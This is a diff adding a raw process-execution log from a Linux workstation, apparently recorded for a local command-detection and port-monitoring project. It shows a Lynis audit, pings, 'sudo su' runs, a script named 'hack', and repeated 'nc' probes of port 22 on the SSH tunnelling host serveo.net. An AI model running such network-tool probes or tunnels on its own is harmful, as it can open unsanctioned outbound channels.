@@ -1,0 +1,473 @@
+[Mon Jun  9 17:04:58 2025] systemd (1): /sbin/init splash noautomount splash
+[Mon Jun  9 17:04:58 2025] haveged (893): /usr/sbin/haveged --Foreground --verbose=1
+[Mon Jun  9 17:04:58 2025] cron (923): /usr/sbin/cron -f
+[Mon Jun  9 17:04:58 2025] dbus-daemon (924): /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+[Mon Jun  9 17:04:58 2025] polkitd (928): /usr/lib/polkit-1/polkitd --no-debug
+[Mon Jun  9 17:04:58 2025] rngd (929): /usr/sbin/rngd -f
+[Mon Jun  9 17:04:58 2025] smartd (931): /usr/sbin/smartd -n
+[Mon Jun  9 17:04:58 2025] NetworkManager (986): /usr/sbin/NetworkManager --no-daemon
+[Mon Jun  9 17:04:58 2025] wpa_supplicant (987): /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
+[Mon Jun  9 17:04:58 2025] chronyd (1052): /usr/sbin/chronyd -F 1
+[Mon Jun  9 17:04:58 2025] agetty (1055): /sbin/agetty -o -p -- \u --noclear - linux
+[Mon Jun  9 17:04:58 2025] Xorg (1056): /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+[Mon Jun  9 17:04:58 2025] chronyd (1070): /usr/sbin/chronyd -F 1
+[Mon Jun  9 17:04:58 2025] postgres (1096): /usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/15/main -c config_file=/etc/postgresql/15/main/postgresql.conf
+[Mon Jun  9 17:04:58 2025] postgres (1144): postgres: 15/main: checkpointer                                                                                          
+[Mon Jun  9 17:04:58 2025] postgres (1145): postgres: 15/main: background writer                                                                                     
+[Mon Jun  9 17:04:58 2025] postgres (1147): postgres: 15/main: walwriter                                                                                             
+[Mon Jun  9 17:04:58 2025] postgres (1148): postgres: 15/main: autovacuum launcher                                                                                   
+[Mon Jun  9 17:04:58 2025] postgres (1149): postgres: 15/main: logical replication launcher                                                                          
+[Mon Jun  9 17:04:58 2025] lightdm (1332): lightdm --session-child 13 20
+[Mon Jun  9 17:04:58 2025] systemd (1352): /lib/systemd/systemd --user
+[Mon Jun  9 17:04:58 2025] pulseaudio (1371): /usr/bin/pulseaudio --daemonize=no --log-target=journal
+[Mon Jun  9 17:04:58 2025] gnome-keyring-daemon (1373): /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+[Mon Jun  9 17:04:58 2025] dbus-daemon (1380): /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+[Mon Jun  9 17:04:58 2025] ssh-agent (1445): /usr/bin/ssh-agent mate-session
+[Mon Jun  9 17:04:58 2025] gvfsd-fuse (1453): /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
+[Mon Jun  9 17:04:58 2025] dbus-daemon (1467): /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus_0
+[Mon Jun  9 17:04:58 2025] at-spi2-registryd (1479): /usr/libexec/at-spi2-registryd --use-gnome-session
+[Mon Jun  9 17:04:58 2025] syndaemon (1514): syndaemon -i 0.5 -K -R
+[Mon Jun  9 17:04:58 2025] sh (1571): /bin/sh -c pkill -15 opensnitch-ui; opensnitch-ui
+[Mon Jun  9 17:04:58 2025] blueman-applet (1572): /usr/bin/python3 /usr/bin/blueman-applet
+[Mon Jun  9 17:04:58 2025] opensnitch-ui (1597): /usr/bin/python3 /usr/bin/opensnitch-ui
+[Mon Jun  9 17:04:58 2025] applet.py (1684): /usr/bin/python3 /usr/share/system-config-printer/applet.py
+[Mon Jun  9 17:04:58 2025] python3 (1686): python3 /usr/bin/hack
+[Mon Jun  9 17:04:58 2025] compiz (1695): compiz --replace
+[Mon Jun  9 17:04:58 2025] fusermount3 (1725): fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+[Mon Jun  9 17:04:58 2025] blueman-tray (1734): /usr/bin/python3 /usr/bin/blueman-tray
+[Mon Jun  9 17:04:58 2025] gvfsd-trash (1881): /usr/libexec/gvfsd-trash --spawner :1.10 /org/gtk/gvfs/exec_spaw/0
+[Mon Jun  9 17:04:58 2025] sh (1887): /bin/sh -c compiz-decorator --replace
+[Mon Jun  9 17:04:58 2025] gtk-window-decorator (1888): gtk-window-decorator --replace
+[Mon Jun  9 17:04:58 2025] mount.ntfs (2117): /sbin/mount.ntfs /dev/sda5 /media/cybergorad/148 Go -o rw,nodev,nosuid,uid=1000,gid=1001,windows_names,uhelper=udisks2
+[Mon Jun  9 17:04:58 2025] sh (2282): /bin/sh -c mate-terminal
+[Mon Jun  9 17:04:58 2025] sudo (2529): sudo su
+[Mon Jun  9 17:04:58 2025] sudo (2534): sudo su
+[Mon Jun  9 17:04:58 2025] daphne (2572): /home/cybergorad/Desktop/django/django-environnement/bin/python3 /home/cybergorad/Desktop/django/django-environnement/bin/daphne -b 0.0.0.0 -p 8000 port_monitor.asgi:application
+[Mon Jun  9 17:04:58 2025] codium (2575): /usr/share/codium/codium --unity-launch
+[Mon Jun  9 17:04:58 2025] codium (2596): /usr/share/codium/codium --type=zygote --no-zygote-sandbox
+[Mon Jun  9 17:04:58 2025] codium (2597): /usr/share/codium/codium --type=zygote
+[Mon Jun  9 17:04:58 2025] codium (2599): /usr/share/codium/codium --type=zygote
+[Mon Jun  9 17:04:58 2025] codium (2633): /usr/share/codium/codium --type=gpu-process --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --gpu-preferences=WAAAAAAAAAAgAAAEAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --shared-files --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:04:58 2025] codium (2641): /usr/share/codium/codium --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:04:58 2025] codium (2679): /usr/share/codium/codium --type=renderer --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --app-path=/usr/share/codium/resources/app --enable-sandbox --enable-blink-features=HighlightAPI --first-renderer-process --lang=en-US --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=4 --time-ticks-at-unix-epoch=-1749476693408747 --launch-time-ticks=284494572 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess --vscode-window-config=vscode:6d46a003-2463-4db9-b053-c439f6424ef1
+[Mon Jun  9 17:04:58 2025] codium (2765): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --dns-result-order=ipv4first --inspect-port=0 --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:04:58 2025] codium (2775): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:04:58 2025] codium (2776): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:04:58 2025] Socket Process (2842): /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20240115170312 -prefsLen 28321 -prefMapSize 241962 -appDir /usr/lib/firefox-esr/browser {71045b43-b8e7-47b2-9c9f-20e36503fec5} 2613 true socket
+[Mon Jun  9 17:04:58 2025] Privileged Cont (2886): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 1 -isForBrowser -prefsLen 28397 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {e4bac63b-f0d7-4e0c-ae51-4abd62523dff} 2613 true tab
+[Mon Jun  9 17:04:58 2025] codium (2923): /usr/share/codium/codium /usr/share/codium/resources/app/extensions/html-language-features/server/dist/node/htmlServerMain --node-ipc --clientProcessId=2765
+[Mon Jun  9 17:04:58 2025] python3 (2944): /bin/python3 /home/cybergorad/.vscode-oss/extensions/ms-python.python-2024.2.1-universal/pythonFiles/run-jedi-language-server.py
+[Mon Jun  9 17:04:58 2025] pcscd (2945): /usr/sbin/pcscd --foreground --auto-exit
+[Mon Jun  9 17:04:58 2025] codium (2950): /usr/share/codium/codium --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US --service-sandbox-type=none --enable-crash-reporter=5fd59ccf-15f4-47c3-9479-ba5c23315eb9,no_channel --user-data-dir=/home/cybergorad/.config/VSCodium --standard-schemes=vscode-webview,vscode-file --enable-sandbox --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,9500104792263893600,4724816815270952478,262144 --disable-features=CalculateNativeWinOcclusion,SpareRendererForSitePerProcess
+[Mon Jun  9 17:04:58 2025] WebExtensions (2979): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 31898 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {76af828c-b287-4282-8937-c0e98e536c09} 2613 true tab
+[Mon Jun  9 17:04:58 2025] Isolated Web Co (4035): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 30 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {ecb5bd76-7358-432a-b7c1-e504625d69b3} 2613 true tab
+[Mon Jun  9 17:04:58 2025] Isolated Web Co (4039): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 31 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {de70d381-6ebd-45d9-82d3-c6e72293a555} 2613 true tab
+[Mon Jun  9 17:04:58 2025] Isolated Web Co (4080): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 32 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {a5e381de-d8bc-4ba3-a833-2296bbff07f4} 2613 true tab
+[Mon Jun  9 17:04:58 2025] Web Content (4118): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 33 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {af9e5d1c-fed6-4a58-ba6b-8f650bbadad5} 2613 true tab
+[Mon Jun  9 17:04:58 2025] Web Content (4416): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 34 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {62f5014e-7d2a-4263-af05-98fa2f3106ce} 2613 true tab
+[Mon Jun  9 17:04:58 2025] RDD Process (4462): /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20240115170312 -prefsLen 32044 -prefMapSize 241962 -appDir /usr/lib/firefox-esr/browser {8a885526-59c7-4f74-9bde-642367b37844} 2613 true rdd
+[Mon Jun  9 17:04:58 2025] Utility Process (4465): /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20240115170312 -sandboxingKind 0 -prefsLen 32044 -prefMapSize 241962 -appDir /usr/lib/firefox-esr/browser {a6012488-577e-4ec4-928e-5d562ec2dac8} 2613 true utility
+[Mon Jun  9 17:04:58 2025] Web Content (4886): /usr/lib/firefox-esr/firefox-esr -contentproc -childID 35 -isForBrowser -prefsLen 25517 -prefMapSize 241962 -jsInitLen 240916 -parentBuildID 20240115170312 -appDir /usr/lib/firefox-esr/browser {5a76472c-fd1b-4e79-a3af-7c855147f099} 2613 true tab
+[Mon Jun  9 17:04:58 2025] mpv (5304): mpv --player-operation-mode=pseudo-gui -- /media/cybergorad/148 Go/GOOD VIBES/jazz/[FREE] JAZZ TYPE BEAT SAXOPHONE - 777 _ LOFI BOOMBAP INSTRUMENTAL 2023.mp4
+[Mon Jun  9 17:04:58 2025] sudo (5438): sudo su
+[Mon Jun  9 17:04:58 2025] sudo (5443): sudo su
+[Mon Jun  9 17:04:58 2025] lynis (5445): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:04:58 2025] lynis (32536): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:04:58 2025] dpkg-query (32537): dpkg-query --search -- /boot/vmlinuz-6.5.0-13parrot1-amd64
+[Mon Jun  9 17:04:58 2025] awk (32538): /usr/bin/awk -F : {print $1}
+[Mon Jun  9 17:04:58 2025] ping (32539): ping -c 3 8.8.8.8
+[Mon Jun  9 17:04:58 2025] python3 (32543): python3 commande_detection.py
+[Mon Jun  9 17:05:01 2025] lynis (32554): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:05:01 2025] apt-cache (32555): apt-cache policy linux-image-6.5.0-13parrot1-amd64
+[Mon Jun  9 17:05:01 2025] grep (32556): grep -E Installed
+[Mon Jun  9 17:05:01 2025] cut (32557): /usr/bin/cut -d : -f2
+[Mon Jun  9 17:05:01 2025] tr (32558): /usr/bin/tr -d  
+[Mon Jun  9 17:05:02 2025] cron (32562): /usr/sbin/CRON -f
+[Mon Jun  9 17:05:02 2025] sendmail (32568): /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root
+[Mon Jun  9 17:05:03 2025] exim4 (32571): /usr/sbin/exim4 -Mc 1uOd7V-0008TI-2k
+[Mon Jun  9 17:05:05 2025] ping (34081): ping -c 3 8.8.8.8
+[Mon Jun  9 17:05:05 2025] lynis (34467): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:05:05 2025] grep (34469): /usr/bin/grep -v No volume groups found
+[Mon Jun  9 17:05:05 2025] grep (34470): /usr/bin/grep VG Name
+[Mon Jun  9 17:05:05 2025] awk (34471): /usr/bin/awk { print $3 }
+[Mon Jun  9 17:05:14 2025] ping (48175): ping -c 3 8.8.8.8
+[Mon Jun  9 17:05:23 2025] ping (62812): ping -c 3 8.8.8.8
+[Mon Jun  9 17:05:24 2025] lynis (64471): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:05:24 2025] apt-get (64472): /usr/bin/apt-get -q=2 check
+[Mon Jun  9 17:05:25 2025] apt-get (64492): /usr/bin/apt-get -q=2 update
+[Mon Jun  9 17:05:30 2025] apt-key (64776): /bin/sh /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.yw948Q /tmp/apt.data.QUmCCX
+[Mon Jun  9 17:05:33 2025] ping (64959): ping -c 3 8.8.8.8
+[Mon Jun  9 17:05:41 2025] ping (65062): ping -c 3 8.8.8.8
+[Mon Jun  9 17:05:51 2025] ping (65069): ping -c 3 8.8.8.8
+[Mon Jun  9 17:05:54 2025] sh (65071): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:05:54 2025] sh (65072): sh -c bash -c "ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN"
+[Mon Jun  9 17:05:54 2025] nc (65073): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:05:54 2025] bash (65074): bash -c ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN
+[Mon Jun  9 17:05:54 2025] ping (65075): ping -c 1 -W 2 8.8.8.8
+[Mon Jun  9 17:05:59 2025] ping (65078): ping -c 3 8.8.8.8
+[Mon Jun  9 17:06:09 2025] ping (65085): ping -c 3 8.8.8.8
+[Mon Jun  9 17:06:18 2025] ping (65095): ping -c 3 8.8.8.8
+[Mon Jun  9 17:06:27 2025] ping (65101): ping -c 3 8.8.8.8
+[Mon Jun  9 17:06:45 2025] ping (65114): ping -c 3 8.8.8.8
+[Mon Jun  9 17:06:53 2025] sh (65144): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:06:53 2025] sh (65145): sh -c bash -c "ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN"
+[Mon Jun  9 17:06:53 2025] nc (65146): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:06:53 2025] bash (65147): bash -c ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN
+[Mon Jun  9 17:06:53 2025] ping (65148): ping -c 1 -W 2 8.8.8.8
+[Mon Jun  9 17:07:03 2025] ping (65154): ping -c 3 8.8.8.8
+[Mon Jun  9 17:07:06 2025] s (65157): /bin/bash /usr/bin/s
+[Mon Jun  9 17:07:06 2025] sleep (65158): sleep 1
+[Mon Jun  9 17:07:07 2025] sleep (65160): sleep 0.5
+[Mon Jun  9 17:07:08 2025] sudo (65162): sudo su
+[Mon Jun  9 17:07:08 2025] sudo (65167): sudo su
+[Mon Jun  9 17:07:21 2025] ping (65194): ping -c 3 8.8.8.8
+[Mon Jun  9 17:07:35 2025] ping (65203): ping google.com
+[Mon Jun  9 17:07:37 2025] lynis (65208): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:07:37 2025] apt-get (65209): /usr/bin/apt-get --dry-run --show-upgraded upgrade
+[Mon Jun  9 17:07:37 2025] grep (65210): /usr/bin/grep -security
+[Mon Jun  9 17:07:37 2025] grep (65211): /usr/bin/grep ^Inst
+[Mon Jun  9 17:07:37 2025] cut (65212): /usr/bin/cut -d   -f2
+[Mon Jun  9 17:07:37 2025] sort (65213): /usr/bin/sort -u
+[Mon Jun  9 17:07:43 2025] ping (65221): ping -c 3 8.8.8.8
+[Mon Jun  9 17:07:54 2025] sh (71319): sh -c nc -z -w 5 serveo.net 22 && echo "open" || echo "closed"
+[Mon Jun  9 17:07:54 2025] sh (71320): sh -c bash -c "ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN"
+[Mon Jun  9 17:07:54 2025] nc (71321): nc -z -w 5 serveo.net 22
+[Mon Jun  9 17:07:54 2025] bash (71322): bash -c ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && echo UP || echo DOWN
+[Mon Jun  9 17:07:54 2025] ping (71323): ping -c 1 -W 2 8.8.8.8
+[Mon Jun  9 17:07:55 2025] lynis (72618): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:07:55 2025] lsof (72619): /usr/bin/lsof -K i -n -w
+[Mon Jun  9 17:07:55 2025] awk (72620): /usr/bin/awk {if ($5=="REG" && $7=="0" && $9 ~ /log$/) {print $1","$9}}
+[Mon Jun  9 17:07:55 2025] lsof (72623): /usr/bin/lsof -K i -n -w
+[Mon Jun  9 17:07:59 2025] lynis (74697): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:07:59 2025] dpkg-query (74698): dpkg-query --search -- /etc/ssl/certs/ssl-cert-snakeoil.pem
+[Mon Jun  9 17:07:59 2025] awk (74699): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:07:59 2025] ping (74700): ping -c 3 8.8.8.8
+[Mon Jun  9 17:08:01 2025] lynis (74867): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:01 2025] dpkg-query (74868): dpkg-query --search -- /usr/share/ca-certificates/mozilla/ANF_Secure_Server_Root_CA.crt
+[Mon Jun  9 17:08:01 2025] awk (74869): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:02 2025] lynis (74919): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:02 2025] dpkg-query (74920): dpkg-query --search -- /usr/share/ca-certificates/mozilla/AffirmTrust_Commercial.crt
+[Mon Jun  9 17:08:02 2025] awk (74921): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:03 2025] lynis (74971): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:03 2025] dpkg-query (74972): dpkg-query --search -- /usr/share/ca-certificates/mozilla/AffirmTrust_Premium.crt
+[Mon Jun  9 17:08:03 2025] awk (74973): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:04 2025] lynis (75023): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:04 2025] dpkg-query (75024): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Amazon_Root_CA_1.crt
+[Mon Jun  9 17:08:04 2025] awk (75025): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:07 2025] lynis (75155): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:07 2025] dpkg-query (75156): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.crt
+[Mon Jun  9 17:08:07 2025] awk (75157): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:08 2025] lynis (75207): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:08 2025] dpkg-query (75208): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Baltimore_CyberTrust_Root.crt
+[Mon Jun  9 17:08:08 2025] awk (75209): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:09 2025] lynis (75259): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:09 2025] dpkg-query (75260): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Buypass_Class_3_Root_CA.crt
+[Mon Jun  9 17:08:09 2025] awk (75261): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:10 2025] lynis (75337): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:10 2025] dpkg-query (75338): dpkg-query --search -- /usr/share/ca-certificates/mozilla/COMODO_Certification_Authority.crt
+[Mon Jun  9 17:08:10 2025] awk (75339): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:11 2025] lynis (75390): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:11 2025] dpkg-query (75391): dpkg-query --search -- /usr/share/ca-certificates/mozilla/COMODO_RSA_Certification_Authority.crt
+[Mon Jun  9 17:08:11 2025] awk (75392): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:12 2025] lynis (75444): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:12 2025] dpkg-query (75445): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Certainly_Root_R1.crt
+[Mon Jun  9 17:08:12 2025] awk (75446): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:13 2025] lynis (75496): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:13 2025] dpkg-query (75497): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Certigna_Root_CA.crt
+[Mon Jun  9 17:08:13 2025] awk (75498): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:15 2025] lynis (75626): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:15 2025] dpkg-query (75627): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Comodo_AAA_Services_root.crt
+[Mon Jun  9 17:08:15 2025] awk (75628): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:16 2025] lynis (75678): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:16 2025] dpkg-query (75679): dpkg-query --search -- /usr/share/ca-certificates/mozilla/D-TRUST_EV_Root_CA_1_2020.crt
+[Mon Jun  9 17:08:16 2025] awk (75680): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:17 2025] lynis (75730): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:17 2025] dpkg-query (75731): dpkg-query --search -- /usr/share/ca-certificates/mozilla/D-TRUST_Root_Class_3_CA_2_EV_2009.crt
+[Mon Jun  9 17:08:17 2025] awk (75732): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:18 2025] ping (75735): ping -c 3 8.8.8.8
+[Mon Jun  9 17:08:18 2025] lynis (75786): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:18 2025] dpkg-query (75787): dpkg-query --search -- /usr/share/ca-certificates/mozilla/DigiCert_Assured_ID_Root_G2.crt
+[Mon Jun  9 17:08:18 2025] awk (75788): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:20 2025] lynis (75916): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:20 2025] dpkg-query (75917): dpkg-query --search -- /usr/share/ca-certificates/mozilla/DigiCert_High_Assurance_EV_Root_CA.crt
+[Mon Jun  9 17:08:20 2025] awk (75918): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:21 2025] lynis (75968): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:21 2025] dpkg-query (75969): dpkg-query --search -- /usr/share/ca-certificates/mozilla/DigiCert_TLS_RSA4096_Root_G5.crt
+[Mon Jun  9 17:08:21 2025] awk (75970): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:22 2025] lynis (76020): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:22 2025] dpkg-query (76021): dpkg-query --search -- /usr/share/ca-certificates/mozilla/E-Tugra_Certification_Authority.crt
+[Mon Jun  9 17:08:22 2025] awk (76022): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:23 2025] lynis (76072): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:24 2025] lynis (76152): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:24 2025] dpkg-query (76153): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Entrust_Root_Certification_Authority_-_EC1.crt
+[Mon Jun  9 17:08:24 2025] awk (76154): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:25 2025] lynis (76204): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:25 2025] dpkg-query (76205): dpkg-query --search -- /usr/share/ca-certificates/mozilla/Entrust_Root_Certification_Authority_-_G4.crt
+[Mon Jun  9 17:08:25 2025] awk (76206): /usr/bin/awk -F: {print $1}
+[Mon Jun  9 17:08:26 2025] lynis (76256): /bin/sh /usr/sbin/lynis audit system --cronjob
+[Mon Jun  9 17:08:26 2025] dpkg-query (76257): dpkg-query --search -- /usr/share/ca-certificates/mozilla/GLOBALTRUST_2020.crt
+[Mon Jun  9 17:08:26 2025] awk (76258): /usr/bin/awk -F: {print $1}
